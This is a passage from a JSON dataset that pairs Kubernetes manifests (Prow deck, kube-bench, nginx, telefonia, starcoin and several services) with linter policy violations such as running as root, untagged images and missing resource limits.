    "id": "6834",
    "manifest_path": "data/manifests/the_stack_sample/sample_2491.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: deck\n  labels:\n    app: deck\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: deck\n  template:\n    metadata:\n      labels:\n        app: deck\n    spec:\n      serviceAccountName: deck\n      containers:\n      - name: deck\n        image: gcr.io/k8s-prow/deck:v20201030-914f29394d\n        imagePullPolicy: Always\n        ports:\n        - name: http\n          containerPort: 8080\n        args:\n        - --kubeconfig=/etc/kubeconfig/config\n        - --tide-url=http://tide/\n        - --hook-url=http://hook:8888/plugin-help\n        - --redirect-http-to=prow.k8s.io\n        - --oauth-url=/github-login\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --spyglass=true\n        - --rerun-creates-job\n        - --github-token-path=/etc/github/oauth\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-oauth-config-file=/etc/githuboauth/secret\n        - --cookie-secret=/etc/cookie/secret\n        - --plugin-config=/etc/plugins/plugins.yaml\n        volumeMounts:\n        - name: oauth-config\n          mountPath: /etc/githuboauth\n          readOnly: true\n        - name: cookie-secret\n          mountPath: /etc/cookie\n          readOnly: true\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: oauth-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: oauth-config\n        secret:\n          secretName: github-oauth-config\n      - name: oauth-token\n        secret:\n          secretName: oauth-token\n      - name: cookie-secret\n        secret:\n          secretName: cookie\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"deck\" is not set to runAsNonRoot"
  },
  {
    "id": "6835",
    "manifest_path": "data/manifests/the_stack_sample/sample_2491.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: deck\n  labels:\n    app: deck\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: deck\n  template:\n    metadata:\n      labels:\n        app: deck\n    spec:\n      serviceAccountName: deck\n      containers:\n      - name: deck\n        image: gcr.io/k8s-prow/deck:v20201030-914f29394d\n        imagePullPolicy: Always\n        ports:\n        - name: http\n          containerPort: 8080\n        args:\n        - --kubeconfig=/etc/kubeconfig/config\n        - --tide-url=http://tide/\n        - --hook-url=http://hook:8888/plugin-help\n        - --redirect-http-to=prow.k8s.io\n        - --oauth-url=/github-login\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --spyglass=true\n        - --rerun-creates-job\n        - --github-token-path=/etc/github/oauth\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-oauth-config-file=/etc/githuboauth/secret\n        - --cookie-secret=/etc/cookie/secret\n        - --plugin-config=/etc/plugins/plugins.yaml\n        volumeMounts:\n        - name: oauth-config\n          mountPath: /etc/githuboauth\n          readOnly: true\n        - name: cookie-secret\n          mountPath: /etc/cookie\n          readOnly: true\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: oauth-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: oauth-config\n        secret:\n          secretName: github-oauth-config\n      - name: oauth-token\n        secret:\n          secretName: oauth-token\n      - name: cookie-secret\n        secret:\n          secretName: cookie\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"deck\" has cpu request 0"
  },
  {
    "id": "6836",
    "manifest_path": "data/manifests/the_stack_sample/sample_2491.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: deck\n  labels:\n    app: deck\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: deck\n  template:\n    metadata:\n      labels:\n        app: deck\n    spec:\n      serviceAccountName: deck\n      containers:\n      - name: deck\n        image: gcr.io/k8s-prow/deck:v20201030-914f29394d\n        imagePullPolicy: Always\n        ports:\n        - name: http\n          containerPort: 8080\n        args:\n        - --kubeconfig=/etc/kubeconfig/config\n        - --tide-url=http://tide/\n        - --hook-url=http://hook:8888/plugin-help\n        - --redirect-http-to=prow.k8s.io\n        - --oauth-url=/github-login\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --spyglass=true\n        - --rerun-creates-job\n        - --github-token-path=/etc/github/oauth\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-oauth-config-file=/etc/githuboauth/secret\n        - --cookie-secret=/etc/cookie/secret\n        - --plugin-config=/etc/plugins/plugins.yaml\n        volumeMounts:\n        - name: oauth-config\n          mountPath: /etc/githuboauth\n          readOnly: true\n        - name: cookie-secret\n          mountPath: /etc/cookie\n          readOnly: true\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: oauth-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: oauth-config\n        secret:\n          secretName: github-oauth-config\n      - name: oauth-token\n        secret:\n          secretName: oauth-token\n      - name: cookie-secret\n        secret:\n          secretName: cookie\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"deck\" has memory limit 0"
  },
  {
    "id": "6837",
    "manifest_path": "data/manifests/the_stack_sample/sample_2492.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: external-server\nspec:\n  ports:\n  - port: 31241\n    nodePort: 31241\n    targetPort: mserver-port\n  selector:\n    app: maestro-server\n  type: NodePort\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:maestro-server])"
  },
  {
    "id": "6838",
    "manifest_path": "data/manifests/the_stack_sample/sample_2494.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: kube-bench\nspec:\n  template:\n    metadata:\n      labels:\n        app: kube-bench\n    spec:\n      containers:\n      - name: kube-bench\n        image: aquasec/kube-bench:latest\n        command:\n        - kube-bench\n        - --version\n        - '1.14'\n        volumeMounts:\n        - name: var-lib-etcd\n          mountPath: /var/lib/etcd\n        - name: var-lib-kubelet\n          mountPath: /var/lib/kubelet\n        - name: etc-systemd\n          mountPath: /etc/systemd\n        - name: etc-kubernetes\n          mountPath: /etc/kubernetes\n        - name: usr-bin\n          mountPath: /usr/bin\n      volumes:\n      - name: var-lib-etcd\n        hostPath:\n          path: /var/lib/etcd\n      - name: var-lib-kubelet\n        hostPath:\n          path: /var/lib/kubelet\n      - name: etc-systemd\n        hostPath:\n          path: /etc/systemd\n      - name: etc-kubernetes\n        hostPath:\n          path: /etc/kubernetes\n      - name: usr-bin\n        hostPath:\n          path: /usr/bin\n",
    "policy_id": "host-pid",
    "violation_text": "object shares the host's process namespace (via hostPID=true)."
  },
  {
    "id": "6839",
    "manifest_path": "data/manifests/the_stack_sample/sample_2494.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: kube-bench\nspec:\n  template:\n    metadata:\n      labels:\n        app: kube-bench\n    spec:\n      containers:\n      - name: kube-bench\n        image: aquasec/kube-bench:latest\n        command:\n        - kube-bench\n        - --version\n        - '1.14'\n        volumeMounts:\n        - name: var-lib-etcd\n          mountPath: /var/lib/etcd\n        - name: var-lib-kubelet\n          mountPath: /var/lib/kubelet\n        - name: etc-systemd\n          mountPath: /etc/systemd\n        - name: etc-kubernetes\n          mountPath: /etc/kubernetes\n        - name: usr-bin\n          mountPath: /usr/bin\n      volumes:\n      - name: var-lib-etcd\n        hostPath:\n          path: /var/lib/etcd\n      - name: var-lib-kubelet\n        hostPath:\n          path: /var/lib/kubelet\n      - name: etc-systemd\n        hostPath:\n          path: /etc/systemd\n      - name: etc-kubernetes\n        hostPath:\n          path: /etc/kubernetes\n      - name: usr-bin\n        hostPath:\n          path: /usr/bin\n",
    "policy_id": "job-ttl-seconds-after-finished",
    "violation_text": "Standalone Job does not specify ttlSecondsAfterFinished"
  },
  {
    "id": "6840",
    "manifest_path": "data/manifests/the_stack_sample/sample_2494.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: kube-bench\nspec:\n  template:\n    metadata:\n      labels:\n        app: kube-bench\n    spec:\n      containers:\n      - name: kube-bench\n        image: aquasec/kube-bench:latest\n        command:\n        - kube-bench\n        - --version\n        - '1.14'\n        volumeMounts:\n        - name: var-lib-etcd\n          mountPath: /var/lib/etcd\n        - name: var-lib-kubelet\n          mountPath: /var/lib/kubelet\n        - name: etc-systemd\n          mountPath: /etc/systemd\n        - name: etc-kubernetes\n          mountPath: /etc/kubernetes\n        - name: usr-bin\n          mountPath: /usr/bin\n      volumes:\n      - name: var-lib-etcd\n        hostPath:\n          path: /var/lib/etcd\n      - name: var-lib-kubelet\n        hostPath:\n          path: /var/lib/kubelet\n      - name: etc-systemd\n        hostPath:\n          path: /etc/systemd\n      - name: etc-kubernetes\n        hostPath:\n          path: /etc/kubernetes\n      - name: usr-bin\n        hostPath:\n          path: /usr/bin\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"kube-bench\" is using an invalid container image, \"aquasec/kube-bench:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "6841",
    "manifest_path": "data/manifests/the_stack_sample/sample_2494.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: kube-bench\nspec:\n  template:\n    metadata:\n      labels:\n        app: kube-bench\n    spec:\n      containers:\n      - name: kube-bench\n        image: aquasec/kube-bench:latest\n        command:\n        - kube-bench\n        - --version\n        - '1.14'\n        volumeMounts:\n        - name: var-lib-etcd\n          mountPath: /var/lib/etcd\n        - name: var-lib-kubelet\n          mountPath: /var/lib/kubelet\n        - name: etc-systemd\n          mountPath: /etc/systemd\n        - name: etc-kubernetes\n          mountPath: /etc/kubernetes\n        - name: usr-bin\n          mountPath: /usr/bin\n      volumes:\n      - name: var-lib-etcd\n        hostPath:\n          path: /var/lib/etcd\n      - name: var-lib-kubelet\n        hostPath:\n          path: /var/lib/kubelet\n      - name: etc-systemd\n        hostPath:\n          path: /etc/systemd\n      - name: etc-kubernetes\n        hostPath:\n          path: /etc/kubernetes\n      - name: usr-bin\n        hostPath:\n          path: /usr/bin\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"kube-bench\" does not have a read-only root file system"
  },
  {
    "id": "6842",
    "manifest_path": "data/manifests/the_stack_sample/sample_2494.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: kube-bench\nspec:\n  template:\n    metadata:\n      labels:\n        app: kube-bench\n    spec:\n      containers:\n      - name: kube-bench\n        image: aquasec/kube-bench:latest\n        command:\n        - kube-bench\n        - --version\n        - '1.14'\n        volumeMounts:\n        - name: var-lib-etcd\n          mountPath: /var/lib/etcd\n        - name: var-lib-kubelet\n          mountPath: /var/lib/kubelet\n        - name: etc-systemd\n          mountPath: /etc/systemd\n        - name: etc-kubernetes\n          mountPath: /etc/kubernetes\n        - name: usr-bin\n          mountPath: /usr/bin\n      volumes:\n      - name: var-lib-etcd\n        hostPath:\n          path: /var/lib/etcd\n      - name: var-lib-kubelet\n        hostPath:\n          path: /var/lib/kubelet\n      - name: etc-systemd\n        hostPath:\n          path: /etc/systemd\n      - name: etc-kubernetes\n        hostPath:\n          path: /etc/kubernetes\n      - name: usr-bin\n        hostPath:\n          path: /usr/bin\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"kube-bench\" is not set to runAsNonRoot"
  },
  {
    "id": "6843",
    "manifest_path": "data/manifests/the_stack_sample/sample_2494.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: kube-bench\nspec:\n  template:\n    metadata:\n      labels:\n        app: kube-bench\n    spec:\n      containers:\n      - name: kube-bench\n        image: aquasec/kube-bench:latest\n        command:\n        - kube-bench\n        - --version\n        - '1.14'\n        volumeMounts:\n        - name: var-lib-etcd\n          mountPath: /var/lib/etcd\n        - name: var-lib-kubelet\n          mountPath: /var/lib/kubelet\n        - name: etc-systemd\n          mountPath: /etc/systemd\n        - name: etc-kubernetes\n          mountPath: /etc/kubernetes\n        - name: usr-bin\n          mountPath: /usr/bin\n      volumes:\n      - name: var-lib-etcd\n        hostPath:\n          path: /var/lib/etcd\n      - name: var-lib-kubelet\n        hostPath:\n          path: /var/lib/kubelet\n      - name: etc-systemd\n        hostPath:\n          path: /etc/systemd\n      - name: etc-kubernetes\n        hostPath:\n          path: /etc/kubernetes\n      - name: usr-bin\n        hostPath:\n          path: /usr/bin\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"kube-bench\" has cpu request 0"
  },
  {
    "id": "6844",
    "manifest_path": "data/manifests/the_stack_sample/sample_2494.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: kube-bench\nspec:\n  template:\n    metadata:\n      labels:\n        app: kube-bench\n    spec:\n      containers:\n      - name: kube-bench\n        image: aquasec/kube-bench:latest\n        command:\n        - kube-bench\n        - --version\n        - '1.14'\n        volumeMounts:\n        - name: var-lib-etcd\n          mountPath: /var/lib/etcd\n        - name: var-lib-kubelet\n          mountPath: /var/lib/kubelet\n        - name: etc-systemd\n          mountPath: /etc/systemd\n        - name: etc-kubernetes\n          mountPath: /etc/kubernetes\n        - name: usr-bin\n          mountPath: /usr/bin\n      volumes:\n      - name: var-lib-etcd\n        hostPath:\n          path: /var/lib/etcd\n      - name: var-lib-kubelet\n        hostPath:\n          path: /var/lib/kubelet\n      - name: etc-systemd\n        hostPath:\n          path: /etc/systemd\n      - name: etc-kubernetes\n        hostPath:\n          path: /etc/kubernetes\n      - name: usr-bin\n        hostPath:\n          path: /usr/bin\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"kube-bench\" has memory limit 0"
  },
  {
    "id": "6845",
    "manifest_path": "data/manifests/the_stack_sample/sample_2495.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  labels:\n    type: adminer\n  name: adminer-service\nspec:\n  ports:\n  - name: adminer-service\n    port: 8080\n    targetPort: 8080\n  selector:\n    type: adminer\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[type:adminer])"
  },
  {
    "id": "6846",
    "manifest_path": "data/manifests/the_stack_sample/sample_2496.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: legacy-system-service\n  labels:\n    app: legacy-system\nspec:\n  type: NodePort\n  ports:\n  - name: employer\n    port: 9000\n    nodePort: 30009\n    targetPort: 9000\n  - name: order\n    port: 9001\n    nodePort: 30109\n    targetPort: 9001\n  - name: shift\n    port: 9002\n    nodePort: 30209\n    targetPort: 9002\n  - name: erp\n    port: 9003\n    nodePort: 30309\n    targetPort: 9003\n  selector:\n    app: legacy-system\n  clusterIP: 10.98.5.213\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:legacy-system])"
  },
  {
    "id": "6847",
    "manifest_path": "data/manifests/the_stack_sample/sample_2497.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-7279\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "6848",
    "manifest_path": "data/manifests/the_stack_sample/sample_2497.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-7279\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "6849",
    "manifest_path": "data/manifests/the_stack_sample/sample_2497.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-7279\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "6850",
    "manifest_path": "data/manifests/the_stack_sample/sample_2497.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-7279\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "6851",
    "manifest_path": "data/manifests/the_stack_sample/sample_2497.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-7279\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "6852",
    "manifest_path": "data/manifests/the_stack_sample/sample_2499.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: telefonia\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: telefonia\n  template:\n    metadata:\n      labels:\n        app: telefonia\n    spec:\n      containers:\n      - name: telefonia\n        image: assaabloy.azurecr.io/telefonia\n        ports:\n        - containerPort: 8080\n        env:\n        - name: TELEFONIA\n          valueFrom:\n            configMapKeyRef:\n              name: telefonia-config\n              key: TELEFONIA_APP_PROFILE\n        - name: TELEFONIA_APP_PORT\n          valueFrom:\n            configMapKeyRef:\n              name: telefonia-config\n              key: TELEFONIA_APP_PORT\n        - name: TELEFONIA_DB_HOST\n          valueFrom:\n            configMapKeyRef:\n              name: telefonia-config\n              key: TELEFONIA_DB_HOST\n        - name: TELEFONIA_DB_NAME\n          valueFrom:\n            configMapKeyRef:\n              name: telefonia-config\n              key: TELEFONIA_DB_NAME\n        - name: TELEFONIA_DB_PORT\n          valueFrom:\n            configMapKeyRef:\n              name: telefonia-config\n              key: TELEFONIA_DB_PORT\n        - name: TELEFONIA_DB_TIMEZONE\n          valueFrom:\n            configMapKeyRef:\n              name: telefonia-config\n              key: TELEFONIA_DB_TIMEZONE\n        - name: TELEFONIA_DB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: telefonia-secret\n              key: TELEFONIA_DB_PASSWORD\n        - name: TELEFONIA_DB_USERNAME\n          valueFrom:\n            secretKeyRef:\n              name: telefonia-secret\n              key: TELEFONIA_DB_USERNAME\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"telefonia\" is using an invalid container image, \"assaabloy.azurecr.io/telefonia\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "6853",
    "manifest_path": "data/manifests/the_stack_sample/sample_2499.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: telefonia\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: telefonia\n  template:\n    metadata:\n      labels:\n        app: telefonia\n    spec:\n      containers:\n      - name: telefonia\n        image: assaabloy.azurecr.io/telefonia\n        ports:\n        - containerPort: 8080\n        env:\n        - name: TELEFONIA\n          valueFrom:\n            configMapKeyRef:\n              name: telefonia-config\n              key: TELEFONIA_APP_PROFILE\n        - name: TELEFONIA_APP_PORT\n          valueFrom:\n            configMapKeyRef:\n              name: telefonia-config\n              key: TELEFONIA_APP_PORT\n        - name: TELEFONIA_DB_HOST\n          valueFrom:\n            configMapKeyRef:\n              name: telefonia-config\n              key: TELEFONIA_DB_HOST\n        - name: TELEFONIA_DB_NAME\n          valueFrom:\n            configMapKeyRef:\n              name: telefonia-config\n              key: TELEFONIA_DB_NAME\n        - name: TELEFONIA_DB_PORT\n          valueFrom:\n            configMapKeyRef:\n              name: telefonia-config\n              key: TELEFONIA_DB_PORT\n        - name: TELEFONIA_DB_TIMEZONE\n          valueFrom:\n            configMapKeyRef:\n              name: telefonia-config\n              key: TELEFONIA_DB_TIMEZONE\n        - name: TELEFONIA_DB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: telefonia-secret\n              key: TELEFONIA_DB_PASSWORD\n        - name: TELEFONIA_DB_USERNAME\n          valueFrom:\n            secretKeyRef:\n              name: telefonia-secret\n              key: TELEFONIA_DB_USERNAME\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"telefonia\" does not have a read-only root file system"
  },
  {
    "id": "6854",
    "manifest_path": "data/manifests/the_stack_sample/sample_2499.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: telefonia\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: telefonia\n  template:\n    metadata:\n      labels:\n        app: telefonia\n    spec:\n      containers:\n      - name: telefonia\n        image: assaabloy.azurecr.io/telefonia\n        ports:\n        - containerPort: 8080\n        env:\n        - name: TELEFONIA\n          valueFrom:\n            configMapKeyRef:\n              name: telefonia-config\n              key: TELEFONIA_APP_PROFILE\n        - name: TELEFONIA_APP_PORT\n          valueFrom:\n            configMapKeyRef:\n              name: telefonia-config\n              key: TELEFONIA_APP_PORT\n        - name: TELEFONIA_DB_HOST\n          valueFrom:\n            configMapKeyRef:\n              name: telefonia-config\n              key: TELEFONIA_DB_HOST\n        - name: TELEFONIA_DB_NAME\n          valueFrom:\n            configMapKeyRef:\n              name: telefonia-config\n              key: TELEFONIA_DB_NAME\n        - name: TELEFONIA_DB_PORT\n          valueFrom:\n            configMapKeyRef:\n              name: telefonia-config\n              key: TELEFONIA_DB_PORT\n        - name: TELEFONIA_DB_TIMEZONE\n          valueFrom:\n            configMapKeyRef:\n              name: telefonia-config\n              key: TELEFONIA_DB_TIMEZONE\n        - name: TELEFONIA_DB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: telefonia-secret\n              key: TELEFONIA_DB_PASSWORD\n        - name: TELEFONIA_DB_USERNAME\n          valueFrom:\n            secretKeyRef:\n              name: telefonia-secret\n              key: TELEFONIA_DB_USERNAME\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"telefonia\" is not set to runAsNonRoot"
  },
  {
    "id": "6855",
    "manifest_path": "data/manifests/the_stack_sample/sample_2499.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: telefonia\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: telefonia\n  template:\n    metadata:\n      labels:\n        app: telefonia\n    spec:\n      containers:\n      - name: telefonia\n        image: assaabloy.azurecr.io/telefonia\n        ports:\n        - containerPort: 8080\n        env:\n        - name: TELEFONIA\n          valueFrom:\n            configMapKeyRef:\n              name: telefonia-config\n              key: TELEFONIA_APP_PROFILE\n        - name: TELEFONIA_APP_PORT\n          valueFrom:\n            configMapKeyRef:\n              name: telefonia-config\n              key: TELEFONIA_APP_PORT\n        - name: TELEFONIA_DB_HOST\n          valueFrom:\n            configMapKeyRef:\n              name: telefonia-config\n              key: TELEFONIA_DB_HOST\n        - name: TELEFONIA_DB_NAME\n          valueFrom:\n            configMapKeyRef:\n              name: telefonia-config\n              key: TELEFONIA_DB_NAME\n        - name: TELEFONIA_DB_PORT\n          valueFrom:\n            configMapKeyRef:\n              name: telefonia-config\n              key: TELEFONIA_DB_PORT\n        - name: TELEFONIA_DB_TIMEZONE\n          valueFrom:\n            configMapKeyRef:\n              name: telefonia-config\n              key: TELEFONIA_DB_TIMEZONE\n        - name: TELEFONIA_DB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: telefonia-secret\n              key: TELEFONIA_DB_PASSWORD\n        - name: TELEFONIA_DB_USERNAME\n          valueFrom:\n            secretKeyRef:\n              name: telefonia-secret\n              key: TELEFONIA_DB_USERNAME\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"telefonia\" has cpu request 0"
  },
  {
    "id": "6856",
    "manifest_path": "data/manifests/the_stack_sample/sample_2499.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: telefonia\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: telefonia\n  template:\n    metadata:\n      labels:\n        app: telefonia\n    spec:\n      containers:\n      - name: telefonia\n        image: assaabloy.azurecr.io/telefonia\n        ports:\n        - containerPort: 8080\n        env:\n        - name: TELEFONIA\n          valueFrom:\n            configMapKeyRef:\n              name: telefonia-config\n              key: TELEFONIA_APP_PROFILE\n        - name: TELEFONIA_APP_PORT\n          valueFrom:\n            configMapKeyRef:\n              name: telefonia-config\n              key: TELEFONIA_APP_PORT\n        - name: TELEFONIA_DB_HOST\n          valueFrom:\n            configMapKeyRef:\n              name: telefonia-config\n              key: TELEFONIA_DB_HOST\n        - name: TELEFONIA_DB_NAME\n          valueFrom:\n            configMapKeyRef:\n              name: telefonia-config\n              key: TELEFONIA_DB_NAME\n        - name: TELEFONIA_DB_PORT\n          valueFrom:\n            configMapKeyRef:\n              name: telefonia-config\n              key: TELEFONIA_DB_PORT\n        - name: TELEFONIA_DB_TIMEZONE\n          valueFrom:\n            configMapKeyRef:\n              name: telefonia-config\n              key: TELEFONIA_DB_TIMEZONE\n        - name: TELEFONIA_DB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: telefonia-secret\n              key: TELEFONIA_DB_PASSWORD\n        - name: TELEFONIA_DB_USERNAME\n          valueFrom:\n            secretKeyRef:\n              name: telefonia-secret\n              key: TELEFONIA_DB_USERNAME\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"telefonia\" has memory limit 0"
  },
  {
    "id": "6857",
    "manifest_path": "data/manifests/the_stack_sample/sample_2501.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: starcoin\n  namespace: starcoin-main\n  labels:\n    app: starcoin\n    network: main\nspec:\n  selector:\n    matchLabels:\n      app: starcoin\n  replicas: 9\n  template:\n    metadata:\n      name: starcoin\n      labels:\n        app: starcoin\n        network: main\n    spec:\n      containers:\n      - name: starcoin\n        image: starcoin/starcoin:v1.9.2\n        imagePullPolicy: Always\n        command:\n        - bash\n        - -c\n        args:\n        - rm -rf /sc-data/main/starcoin.ipc /sc-data/main/starcoindb/db/starcoindb/LOCK;\n          id=$(echo -e $POD_NAME|awk -F'-' '{print $2}') && IFS='; ' read -r -a node_keys\n          <<< $NODE_KEYS && node_key=${node_keys[$id]}; if [ ! -z $node_key ]; then\n          node_key_flag=\"--node-key ${node_key}\"; fi; /starcoin/starcoin -n main --discover-local\n          true --disable-miner-client true --min-peers-to-propagate 512 --max-peers-to-propagate\n          1024 --max-outgoing-peers 512 --max-incoming-peers 512 -d /sc-data $node_key_flag;\n        ports:\n        - containerPort: 9840\n          hostPort: 9840\n        volumeMounts:\n        - name: starcoin-volume\n          mountPath: /sc-data\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: NODE_KEYS\n          valueFrom:\n            secretKeyRef:\n              name: node-keys\n              key: node-keys\n        livenessProbe:\n          tcpSocket:\n            port: 9840\n          initialDelaySeconds: 20\n          periodSeconds: 5\n          timeoutSeconds: 2\n          failureThreshold: 4\n          successThreshold: 1\n        readinessProbe:\n          exec:\n            command:\n            - sh\n            - -c\n            - /starcoin/starcoin -n main -d /sc-data node sync status|grep Synchronized\n          initialDelaySeconds: 10\n          periodSeconds: 5\n          timeoutSeconds: 2\n          failureThreshold: 3\n          successThreshold: 1\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 9 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "6858",
    "manifest_path": "data/manifests/the_stack_sample/sample_2501.yaml",
